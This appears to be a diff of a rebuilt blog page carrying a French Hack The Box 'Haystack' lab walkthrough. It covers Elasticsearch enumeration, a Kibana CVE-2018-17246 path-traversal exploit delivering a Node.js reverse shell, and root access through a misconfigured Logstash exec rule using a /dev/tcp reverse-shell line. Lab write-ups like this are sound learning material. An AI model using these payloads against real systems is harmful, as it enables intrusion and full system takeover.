@@ -11,7 +11,7 @@
 <meta http-equiv="Cache-Control" content="public" />
 <!-- Enable responsiveness on mobile devices -->
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
-<meta name="generator" content="Hugo 0.55.6" />
+<meta name="generator" content="Hugo 0.80.0" />
 
     
     
@@ -23,17 +23,15 @@
 <meta name="twitter:card" content="summary"/>
 <meta name="twitter:title" content="Hack The Box - Haystack"/>
 <meta name="twitter:description" content="[NO ENGLISH VERSION - Only French is available for this post]
-
 Haystack est une machine Linux catégorisée comme facile et plutôt intéressante, faisant intervenir ELK. L&rsquo;énumération des endpoints web et des indices permet de récupérer un accès SSH utilisateur tandis que l&rsquo;exploitation de la CVE-2018-17246 sur le composant Kibana permet de récupérer un accès plus intéressant. Enfin, l&rsquo;exploitation d&rsquo;un Logstash mal configuré permet d&rsquo;élever ses privilèges."/>
 
 <meta property="og:title" content="Hack The Box - Haystack" />
 <meta property="og:description" content="[NO ENGLISH VERSION - Only French is available for this post]
-
 Haystack est une machine Linux catégorisée comme facile et plutôt intéressante, faisant intervenir ELK. L&rsquo;énumération des endpoints web et des indices permet de récupérer un accès SSH utilisateur tandis que l&rsquo;exploitation de la CVE-2018-17246 sur le composant Kibana permet de récupérer un accès plus intéressant. Enfin, l&rsquo;exploitation d&rsquo;un Logstash mal configuré permet d&rsquo;élever ses privilèges." />
 <meta property="og:type" content="article" />
 <meta property="og:url" content="https://haax9.github.io/en/walkthroughs/hackthebox/haystack/" />
-<meta property="article:published_time" content="2019-11-09T00:00:00&#43;00:00"/>
-<meta property="article:modified_time" content="2019-11-09T00:00:00&#43;00:00"/><meta property="og:site_name" content="Haax - Personal Blog" />
+<meta property="article:published_time" content="2019-11-09T00:00:00+00:00" />
+<meta property="article:modified_time" content="2019-11-09T00:00:00+00:00" /><meta property="og:site_name" content="Haax - Personal Blog" />
 
 
     
@@ -56,6 +54,32 @@ Haystack est une machine Linux catégorisée comme facile et plutôt intéressan
     <!-- Icons -->
     <link rel="apple-touch-icon-precomposed" sizes="144x144" href="/apple-touch-icon-144-precomposed.png">
     <link rel="shortcut icon" href="/favicon.png">
+    
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+	ga('create', 'G-GB7QC0EDF8', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+
+    
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	ga('create', 'G-GB7QC0EDF8', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+<script async src='https://www.google-analytics.com/analytics.js'></script>
+
     
 
 </head>
@@ -174,7 +198,7 @@ Haystack est une machine Linux catégorisée comme facile et plutôt intéressan
       <a rel="alternate" href="/fr/walkthroughs/hackthebox/haystack/" hreflang="fr" lang="fr"><img src="/img/icons/logo_drapeau_france.png" alt="logo_fracne" class="logoFlag"/></a>
       </div>
     <p class="copyright">
-      &copy; 2022 Haax.
+      &copy; 2023 Haax.
       <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/">Some Rights Reserved</a>.
       <br/>Built with
       <a href="https://gohugo.io">Hugo</a> ❤️ <a href="https://github.com/htr3n/hyde-hyde">hyde-hyde</a>.
@@ -208,15 +232,10 @@ Haystack est une machine Linux catégorisée comme facile et plutôt intéressan
   </header>
   <div class="post">
     <p>[NO ENGLISH VERSION - Only French is available for this post]</p>
-
 <p>Haystack est une machine Linux catégorisée comme facile et plutôt intéressante, faisant intervenir ELK. L&rsquo;énumération des endpoints web et des indices permet de récupérer un accès SSH utilisateur tandis que l&rsquo;exploitation de la CVE-2018-17246 sur le composant Kibana permet de récupérer un accès plus intéressant. Enfin, l&rsquo;exploitation d&rsquo;un Logstash mal configuré permet d&rsquo;élever ses privilèges.</p>
-
 <p><strong>Disclaimer :</strong> Il s&rsquo;agit d&rsquo;une présentation plutôt rapide qui omet volontairement les différents axes de recherche. Seul les résultats effectifs ainsi qu&rsquo;une rapide démarche sont présentés.</p>
-
 <h2 id="découverte">Découverte</h2>
-
 <p>Un rapide scan de ports permet de découvrir les services présents sur la machine.</p>
-
 <pre><code>$ nmap -v -sV -sC -O -p 22,80,9200 -oA scan_nmap 10.10.10.115
 
 Nmap scan report for 10.10.10.115
@@ -246,10 +265,7 @@ No exact OS matches for host (test conditions non-ideal).
 Uptime guess: 0.051 days (since Sat Aug 24 22:31:58 2019)
 TCP Sequence Prediction: Difficulty=262 (Good luck!)
 IP ID Sequence Generation: All zeros
-</code></pre>
-
-<p>Le port 80 est ouvert et propose une image à l&rsquo;utilisateur. Quelques recherches sur le fichiers sont effectuées et une base64 est trouvée dans les commentaires de l&rsquo;image.</p>
-
+</code></pre><p>Le port 80 est ouvert et propose une image à l&rsquo;utilisateur. Quelques recherches sur le fichiers sont effectuées et une base64 est trouvée dans les commentaires de l&rsquo;image.</p>
 <pre><code>$ strings needle.jpg
 
 *Oo!;.o|?&gt;
@@ -260,136 +276,99 @@ BN2I
 ,'*'
 I$f2/&lt;-iy
 bGEgYWd1amEgZW4gZWwgcGFqYXIgZXMgImNsYXZlIg==
-</code></pre>
-
-<pre><code>$ echo -n &quot;bGEgYWd1amEgZW4gZWwgcGFqYXIgZXMgImNsYXZlIg==&quot; | base64 -d
+</code></pre><pre><code>$ echo -n &quot;bGEgYWd1amEgZW4gZWwgcGFqYXIgZXMgImNsYXZlIg==&quot; | base64 -d
 la aguja en el pajar es &quot;clave&quot;% 
-</code></pre>
-
-<p>Ce qui signifie <code>L'aiguille dans la botte de foin est &quot;la clé&quot;.</code></p>
-
+</code></pre><p>Ce qui signifie <code>L'aiguille dans la botte de foin est &quot;la clé&quot;.</code></p>
 <p>Le port 9200 est également ouvert. Il s&rsquo;agit de l&rsquo;API utilisée par ELK.</p>
-
-<pre><code class="language-json">name    &quot;iQEYHgS&quot;
-cluster_name    &quot;elasticsearch&quot;
-cluster_uuid    &quot;pjrX7V_gSFmJY-DxP4tCQg&quot;
-version 
-number  &quot;6.4.2&quot;
-build_flavor    &quot;default&quot;
-build_type  &quot;rpm&quot;
-build_hash  &quot;04711c2&quot;
-build_date  &quot;2018-09-26T13:34:09.098244Z&quot;
-build_snapshot  false
-lucene_version  &quot;7.4.0&quot;
-minimum_wire_compatibility_version  &quot;5.6.0&quot;
-minimum_index_compatibility_version &quot;5.0.0&quot;
-tagline &quot;You Know, for Search&quot;
-</code></pre>
-
-<h2 id="accès-ssh-shell-utilisateur">Accès SSH - Shell utilisateur</h2>
-
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json"><span style="color:#960050;background-color:#1e0010">name</span>	<span style="color:#e6db74">&#34;iQEYHgS&#34;</span>
+<span style="color:#960050;background-color:#1e0010">cluster_name</span>	<span style="color:#e6db74">&#34;elasticsearch&#34;</span>
+<span style="color:#960050;background-color:#1e0010">cluster_uuid</span>	<span style="color:#e6db74">&#34;pjrX7V_gSFmJY-DxP4tCQg&#34;</span>
+<span style="color:#960050;background-color:#1e0010">version</span>	
+<span style="color:#960050;background-color:#1e0010">number</span>	<span style="color:#e6db74">&#34;6.4.2&#34;</span>
+<span style="color:#960050;background-color:#1e0010">build_flavor</span>	<span style="color:#e6db74">&#34;default&#34;</span>
+<span style="color:#960050;background-color:#1e0010">build_type</span>	<span style="color:#e6db74">&#34;rpm&#34;</span>
+<span style="color:#960050;background-color:#1e0010">build_hash</span>	<span style="color:#e6db74">&#34;04711c2&#34;</span>
+<span style="color:#960050;background-color:#1e0010">build_date</span>	<span style="color:#e6db74">&#34;2018-09-26T13:34:09.098244Z&#34;</span>
+<span style="color:#960050;background-color:#1e0010">build_snapshot</span>	<span style="color:#66d9ef">false</span>
+<span style="color:#960050;background-color:#1e0010">lucene_version</span>	<span style="color:#e6db74">&#34;7.4.0&#34;</span>
+<span style="color:#960050;background-color:#1e0010">minimum_wire_compatibility_version</span>	<span style="color:#e6db74">&#34;5.6.0&#34;</span>
+<span style="color:#960050;background-color:#1e0010">minimum_index_compatibility_version</span>	<span style="color:#e6db74">&#34;5.0.0&#34;</span>
+<span style="color:#960050;background-color:#1e0010">tagline</span>	<span style="color:#e6db74">&#34;You Know, for Search&#34;</span>
+</code></pre></div><h2 id="accès-ssh---shell-utilisateur">Accès SSH - Shell utilisateur</h2>
 <p>Après quelques lectures sur le fonctionnement de ELK et la présentation des données, on peut effectuer quelques recherches directement via le navigateur afin d&rsquo;énumérer ce qui est présent.</p>
-
 <p>On commence par énumérer les différents indices (grossièrement, équivalent à des BDD).</p>
-
 <pre><code>http://10.10.10.115:9200/_cat/indices
 
 green  open .kibana 6tjAYZrgQ5CwwR0g6VOoRg 1 0    1 0     4kb     4kb
 yellow open quotes  ZG2D1IqkQNiNZmi2HRImnQ 5 1  253 0 262.7kb 262.7kb
 yellow open bank    eSVpNfCfREyYoVigNWcrMw 5 1 1000 0 483.2kb 483.2kb
-</code></pre>
-
-<p>Il est également possible de les récupérer en affichant l&rsquo;ensemble des éléments, ainsi que des statistiques sur chacun d&rsquo;entre eux.</p>
-
+</code></pre><p>Il est également possible de les récupérer en affichant l&rsquo;ensemble des éléments, ainsi que des statistiques sur chacun d&rsquo;entre eux.</p>
 <pre><code>http://10.10.10.115:9200/_all
 http://10.10.10.115:9200/_stats
-</code></pre>
-
-<p>On apprend également qu&rsquo;il est possible d&rsquo;effectuer des recherches via le endpoint <code>/quotes/_search?q=x</code>. Ainsi, après quelques tentatives infructueuses, on trouve un enregistrement en utilisant le mot clé &ldquo;clave&rdquo; récupéré auparavant.</p>
-
+</code></pre><p>On apprend également qu&rsquo;il est possible d&rsquo;effectuer des recherches via le endpoint <code>/quotes/_search?q=x</code>. Ainsi, après quelques tentatives infructueuses, on trouve un enregistrement en utilisant le mot clé &ldquo;clave&rdquo; récupéré auparavant.</p>
 <pre><code>http://10.10.10.115:9200/quotes/_search?q=clave
-    
-took    6
-timed_out   false
-_shards 
-total   5
-successful  5
-skipped 0
-failed  0
-hits    
-total   2
-max_score   5.9335938
-hits    
-0   
-_index  &quot;quotes&quot;
-_type   &quot;quote&quot;
-_id &quot;45&quot;
-_score  5.9335938
-_source 
-quote   &quot;Tengo que guardar la clave para la maquina: dXNlcjogc2VjdXJpdHkg &quot;
-1   
-_index  &quot;quotes&quot;
-_type   &quot;quote&quot;
-_id &quot;111&quot;
-_score  5.3459888
-_source 
-quote   &quot;Esta clave no se puede perder, la guardo aca: cGFzczogc3BhbmlzaC5pcy5rZXk=&quot;
-</code></pre>
-
-<p>La traduction des deux phrases en espagnol donne :</p>
-
+	
+took	6
+timed_out	false
+_shards	
+total	5
+successful	5
+skipped	0
+failed	0
+hits	
+total	2
+max_score	5.9335938
+hits	
+0	
+_index	&quot;quotes&quot;
+_type	&quot;quote&quot;
+_id	&quot;45&quot;
+_score	5.9335938
+_source	
+quote	&quot;Tengo que guardar la clave para la maquina: dXNlcjogc2VjdXJpdHkg &quot;
+1	
+_index	&quot;quotes&quot;
+_type	&quot;quote&quot;
+_id	&quot;111&quot;
+_score	5.3459888
+_source	
+quote	&quot;Esta clave no se puede perder, la guardo aca: cGFzczogc3BhbmlzaC5pcy5rZXk=&quot;
+</code></pre><p>La traduction des deux phrases en espagnol donne :</p>
 <pre><code>&quot;Je dois sauvegarder la clé pour la machine : dXNlcjogc2VjdXJpdHkg&quot;
 &quot;Cette clé ne peut pas être perdue, gardez-la ici : cGFzczogc3BhbmlzaC5pcy5rZXk=&quot;
-</code></pre>
-
-<p>Les deux chaines sont en réalités des base64 qui une fois décodées&hellip;</p>
-
-<pre><code class="language-bash">$ echo -n &quot;dXNlcjogc2VjdXJpdHkg&quot; | base64 -d
+</code></pre><p>Les deux chaines sont en réalités des base64 qui une fois décodées&hellip;</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ echo -n <span style="color:#e6db74">&#34;dXNlcjogc2VjdXJpdHkg&#34;</span> | base64 -d
 user: security %
 
-$ echo -n &quot;cGFzczogc3BhbmlzaC5pcy5rZXk=&quot; | base64 -d
+$ echo -n <span style="color:#e6db74">&#34;cGFzczogc3BhbmlzaC5pcy5rZXk=&#34;</span> | base64 -d
 pass: spanish.is.key% 
-</code></pre>
-
-<p>&hellip; Donnent un accès à la machine, et par extension le premier flag.</p>
-
+</code></pre></div><p>&hellip; Donnent un accès à la machine, et par extension le premier flag.</p>
 <pre><code>$ ssh security@10.10.10.115
 security@10.10.10.115's password: 
 Last login: Tue Sep 24 08:51:21 2019 from 10.10.12.127
 [security@haystack ~]$ whoami
 security
-</code></pre>
-
-<h2 id="cve-2018-17246-rce-avec-kibana">CVE-2018-17246 - RCE avec Kibana</h2>
-
+</code></pre><h2 id="cve-2018-17246---rce-avec-kibana">CVE-2018-17246 - RCE avec Kibana</h2>
 <p>Vient maintenant une phase de recherche et d&rsquo;énumération d&rsquo;informations sur la machine, avec pour objectif principal compromettre le compte root.</p>
-
 <p>Après quelques recherches, on se tourne vers d&rsquo;éventuelles vulnérabilités liées à ELK et notamment à la CVE-2018-17246 qui pourrait permettre une exécution de commandes.
 Le dépôt Github suivant permet de comprendre son fonctionnement ainsi que son exploitation : <a href="https://github.com/mpgn/CVE-2018-17246">https://github.com/mpgn/CVE-2018-17246</a></p>
-
 <p>Ayant un premier accès à la machine, on crée un fichier JS dans le répertoire <code>/tmp/shell.js</code>.</p>
-
-<pre><code class="language-javascript">(function(){
-    var net = require(&quot;net&quot;),
-        cp = require(&quot;child_process&quot;),
-        sh = cp.spawn(&quot;/bin/sh&quot;, []);
-    var client = new net.Socket();
-    client.connect(&lt;LPORT&gt;, &quot;&lt;ATTACKER IP&quot;, function(){
-        client.pipe(sh.stdin);
-        sh.stdout.pipe(client);
-        sh.stderr.pipe(client);
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript">(<span style="color:#66d9ef">function</span>(){
+    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">net</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#34;net&#34;</span>),
+        <span style="color:#a6e22e">cp</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#34;child_process&#34;</span>),
+        <span style="color:#a6e22e">sh</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">cp</span>.<span style="color:#a6e22e">spawn</span>(<span style="color:#e6db74">&#34;/bin/sh&#34;</span>, []);
+    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">client</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">net</span>.<span style="color:#a6e22e">Socket</span>();
+    <span style="color:#a6e22e">client</span>.<span style="color:#a6e22e">connect</span>(<span style="color:#f92672">&lt;</span><span style="color:#a6e22e">LPORT</span><span style="color:#f92672">&gt;</span>, <span style="color:#e6db74">&#34;&lt;ATTACKER IP&#34;</span>, <span style="color:#66d9ef">function</span>(){
+        <span style="color:#a6e22e">client</span>.<span style="color:#a6e22e">pipe</span>(<span style="color:#a6e22e">sh</span>.<span style="color:#a6e22e">stdin</span>);
+        <span style="color:#a6e22e">sh</span>.<span style="color:#a6e22e">stdout</span>.<span style="color:#a6e22e">pipe</span>(<span style="color:#a6e22e">client</span>);
+        <span style="color:#a6e22e">sh</span>.<span style="color:#a6e22e">stderr</span>.<span style="color:#a6e22e">pipe</span>(<span style="color:#a6e22e">client</span>);
     });
-    return /a/; // Prevents the Node.js application form crashing
-})();
-</code></pre>
-
-<p>On lance un listener sur notre machine d&rsquo;attaque, sur le port souhaité : <code>nc -lvvp 6543</code>
+    <span style="color:#66d9ef">return</span> <span style="color:#e6db74">/a/</span>; <span style="color:#75715e">// Prevents the Node.js application form crashing
+</span><span style="color:#75715e"></span>})();
+</code></pre></div><p>On lance un listener sur notre machine d&rsquo;attaque, sur le port souhaité : <code>nc -lvvp 6543</code>
 Puis on lance l&rsquo;exploit en local sur la machine.</p>
-
-<pre><code class="language-bash">$ curl &quot;http://127.0.0.1:5601/api/console/api_server?sense_version=%40%40SENSE_VERSION&amp;apis=../../../../../../../../../../../tmp/shell.js&quot;
-</code></pre>
-
-<pre><code>$ nc -lvvp 6543
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ curl <span style="color:#e6db74">&#34;http://127.0.0.1:5601/api/console/api_server?sense_version=%40%40SENSE_VERSION&amp;apis=../../../../../../../../../../../tmp/shell.js&#34;</span>
+</code></pre></div><pre><code>$ nc -lvvp 6543
 listening on [any] 6543 ...
 10.10.10.115: inverse host lookup failed: Unknown host
 connect to [10.10.13.211] from (UNKNOWN) [10.10.10.115] 45818
@@ -398,14 +377,9 @@ whoami
 kibana
 python -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'
 bash-4.2$ 
-</code></pre>
-
-<h2 id="escalade-de-privilèges">Escalade de Privilèges</h2>
-
+</code></pre><h2 id="escalade-de-privilèges">Escalade de Privilèges</h2>
 <p>Dernière ligne droite, la compromission. On dispose maintenant d&rsquo;un utilisateur &ldquo;limité&rdquo; mais néanmoins utile car ayant accès à des fichiers de configuration.</p>
-
 <p>On peut notamment voir dans le fichier de startup que logstash est lancé avec des droits root.</p>
-
 <pre><code>$ cat /etc/logstash/startup.options
 
 # user and group id to be invoked as
@@ -413,90 +387,67 @@ bash-4.2$
 #LS_GROUP=logstash
 LS_USER=root
 LS_GROUP=root
-</code></pre>
+</code></pre><p>On trouve également des informations très intéressantes dans le répertoire <code>/etc/logstash/conf.d</code>. Des fichiers appartenant à root&hellip; Mais accessibles en lecture au groupe kibana.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ ls -la
 
-<p>On trouve également des informations très intéressantes dans le répertoire <code>/etc/logstash/conf.d</code>. Des fichiers appartenant à root&hellip; Mais accessibles en lecture au groupe kibana.</p>
-
-<pre><code class="language-bash">$ ls -la
-
-drwxrwxr-x. 2 root kibana  62 jun 24 08:12 .
-drwxr-xr-x. 3 root root   183 jun 18 22:15 ..
--rw-r-----. 1 root kibana 131 jun 20 10:59 filter.conf
--rw-r-----. 1 root kibana 186 jun 24 08:12 input.conf
--rw-r-----. 1 root kibana 109 jun 24 08:12 output.conf
-</code></pre>
-
-<pre><code class="language-bash">bash-4.2$ cat filter.conf
+drwxrwxr-x. <span style="color:#ae81ff">2</span> root kibana  <span style="color:#ae81ff">62</span> jun <span style="color:#ae81ff">24</span> 08:12 .
+drwxr-xr-x. <span style="color:#ae81ff">3</span> root root   <span style="color:#ae81ff">183</span> jun <span style="color:#ae81ff">18</span> 22:15 ..
+-rw-r-----. <span style="color:#ae81ff">1</span> root kibana <span style="color:#ae81ff">131</span> jun <span style="color:#ae81ff">20</span> 10:59 filter.conf
+-rw-r-----. <span style="color:#ae81ff">1</span> root kibana <span style="color:#ae81ff">186</span> jun <span style="color:#ae81ff">24</span> 08:12 input.conf
+-rw-r-----. <span style="color:#ae81ff">1</span> root kibana <span style="color:#ae81ff">109</span> jun <span style="color:#ae81ff">24</span> 08:12 output.conf
+</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">bash-4.2$ cat filter.conf
 cat filter.conf
-filter {
-    if [type] == &quot;execute&quot; {
-        grok {
-            match =&gt; { &quot;message&quot; =&gt; &quot;Ejecutar\s*comando\s*:\s+%{GREEDYDATA:comando}&quot; }
-        }
-    }
-}
-</code></pre>
-
-<pre><code class="language-bash">bash-4.2$ cat input.conf
+filter <span style="color:#f92672">{</span>
+	<span style="color:#66d9ef">if</span> <span style="color:#f92672">[</span>type<span style="color:#f92672">]</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;execute&#34;</span> <span style="color:#f92672">{</span>
+		grok <span style="color:#f92672">{</span>
+			match <span style="color:#f92672">=</span>&gt; <span style="color:#f92672">{</span> <span style="color:#e6db74">&#34;message&#34;</span> <span style="color:#f92672">=</span>&gt; <span style="color:#e6db74">&#34;Ejecutar\s*comando\s*:\s+%{GREEDYDATA:comando}&#34;</span> <span style="color:#f92672">}</span>
+		<span style="color:#f92672">}</span>
+	<span style="color:#f92672">}</span>
+<span style="color:#f92672">}</span>
+</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">bash-4.2$ cat input.conf
 cat input.conf
-input {
-    file {
-        path =&gt; &quot;/opt/kibana/logstash_*&quot;
-        start_position =&gt; &quot;beginning&quot;
-        sincedb_path =&gt; &quot;/dev/null&quot;
-        stat_interval =&gt; &quot;10 second&quot;
-        type =&gt; &quot;execute&quot;
-        mode =&gt; &quot;read&quot;
-    }
-}
-</code></pre>
-
-<pre><code class="language-bash">bash-4.2$ cat output.conf
+input <span style="color:#f92672">{</span>
+	file <span style="color:#f92672">{</span>
+		path <span style="color:#f92672">=</span>&gt; <span style="color:#e6db74">&#34;/opt/kibana/logstash_*&#34;</span>
+		start_position <span style="color:#f92672">=</span>&gt; <span style="color:#e6db74">&#34;beginning&#34;</span>
+		sincedb_path <span style="color:#f92672">=</span>&gt; <span style="color:#e6db74">&#34;/dev/null&#34;</span>
+		stat_interval <span style="color:#f92672">=</span>&gt; <span style="color:#e6db74">&#34;10 second&#34;</span>
+		type <span style="color:#f92672">=</span>&gt; <span style="color:#e6db74">&#34;execute&#34;</span>
+		mode <span style="color:#f92672">=</span>&gt; <span style="color:#e6db74">&#34;read&#34;</span>
+	<span style="color:#f92672">}</span>
+<span style="color:#f92672">}</span>
+</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">bash-4.2$ cat output.conf
 cat output.conf
-output {
-    if [type] == &quot;execute&quot; {
-        stdout { codec =&gt; json }
-        exec {
-            command =&gt; &quot;%{comando} &amp;&quot;
-        }
-    }
-}
-</code></pre>
-
-<p>Ok&hellip; On se pose quelques minutes (ou dizaines de minutes..) et on analyse tout ça. Avec un peu de recherche, on arrive à comprendre ce qu&rsquo;il se passe, à savoir :</p>
-
+output <span style="color:#f92672">{</span>
+	<span style="color:#66d9ef">if</span> <span style="color:#f92672">[</span>type<span style="color:#f92672">]</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;execute&#34;</span> <span style="color:#f92672">{</span>
+		stdout <span style="color:#f92672">{</span> codec <span style="color:#f92672">=</span>&gt; json <span style="color:#f92672">}</span>
+		exec <span style="color:#f92672">{</span>
+			command <span style="color:#f92672">=</span>&gt; <span style="color:#e6db74">&#34;%{comando} &amp;&#34;</span>
+		<span style="color:#f92672">}</span>
+	<span style="color:#f92672">}</span>
+<span style="color:#f92672">}</span>
+</code></pre></div><p>Ok&hellip; On se pose quelques minutes (ou dizaines de minutes..) et on analyse tout ça. Avec un peu de recherche, on arrive à comprendre ce qu&rsquo;il se passe, à savoir :</p>
 <ul>
 <li>Toutes les 10 sec, le service va lire les fichiers de <code>/opt/kibana/</code> dont le nom commence par <code>logstash_</code></li>
 <li>Un pattern &ldquo;grok&rdquo; est utilisé afin de rechercher une chaine précise</li>
 <li>Si la chaine &ldquo;Ejecutar\s<em>comando\s</em>:\s+%{GREEDYDATA:comando}&rdquo; est contenue dans la ligne de log, alors le fichier <code>output.conf</code> lance l&rsquo;exécution de la commande associée&hellip;</li>
 </ul>
-
 <p>Étant donné que le service est lancé en root, les commandes exécutées le seront également.
 Ok, il reste à construire notre payload. Il est possible de PoC le fonctionnement de l&rsquo;exploit avec des commandes classiques mais ici je mets directement en place mon reverse shell.</p>
-
 <p>De la même façon, on met en place notre listener.</p>
-
-<pre><code class="language-bash">$ nc -lvvp 6688                               
-listening on [any] 6688 ...
-</code></pre>
-
-<p>Puis on crée un fichier <code>/opt/kibana/logstash_pwn</code> qui contient la chaine correspondant au pattern, permettant d&rsquo;exécuter notre commande. Il est également possible de tester en ligne différents pattern jusqu&rsquo;à trouver une chaine correspondante : <a href="https://grokconstructor.appspot.com/do/match#result">https://grokconstructor.appspot.com/do/match#result</a></p>
-
-<pre><code class="language-bash">$ cat /opt/kibana/logstash_pwn
-Ejecutar comando : /bin/bash -i &gt;&amp; /dev/tcp/&lt;ATTACKER-IP&gt;/6688 0&gt;&amp;1
-</code></pre>
-
-<p>Quelques secondes d&rsquo;attente et&hellip;</p>
-
-<pre><code class="language-bash">$ nc -lvvp 6688
-listening on [any] 6688 ...
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ nc -lvvp <span style="color:#ae81ff">6688</span>                               
+listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">6688</span> ...
+</code></pre></div><p>Puis on crée un fichier <code>/opt/kibana/logstash_pwn</code> qui contient la chaine correspondant au pattern, permettant d&rsquo;exécuter notre commande. Il est également possible de tester en ligne différents pattern jusqu&rsquo;à trouver une chaine correspondante : <a href="https://grokconstructor.appspot.com/do/match#result">https://grokconstructor.appspot.com/do/match#result</a></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ cat /opt/kibana/logstash_pwn
+Ejecutar comando : /bin/bash -i &gt;&amp; /dev/tcp/&lt;ATTACKER-IP&gt;/6688 0&gt;&amp;<span style="color:#ae81ff">1</span>
+</code></pre></div><p>Quelques secondes d&rsquo;attente et&hellip;</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ nc -lvvp <span style="color:#ae81ff">6688</span>
+listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">6688</span> ...
 10.10.10.115: inverse host lookup failed: Unknown host
-connect to [10.10.13.211] from (UNKNOWN) [10.10.10.115] 47512
+connect to <span style="color:#f92672">[</span>10.10.13.211<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.10.10.115<span style="color:#f92672">]</span> <span style="color:#ae81ff">47512</span>
 bash: no hay control de trabajos en este shell
-[root@haystack /]#
-</code></pre>
-
-<p>w00ted!</p>
+<span style="color:#f92672">[</span>root@haystack /<span style="color:#f92672">]</span><span style="color:#75715e">#</span>
+</code></pre></div><p>w00ted!</p>
   </div>
   
 
@@ -534,7 +485,7 @@ bash: no hay control de trabajos en este shell
 var doNotTrack = false;
 if (!doNotTrack) {
 	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
-	ga('create', 'UA-126182747-1', 'auto');
+	ga('create', 'G-GB7QC0EDF8', 'auto');
 	
 	ga('send', 'pageview');
 }
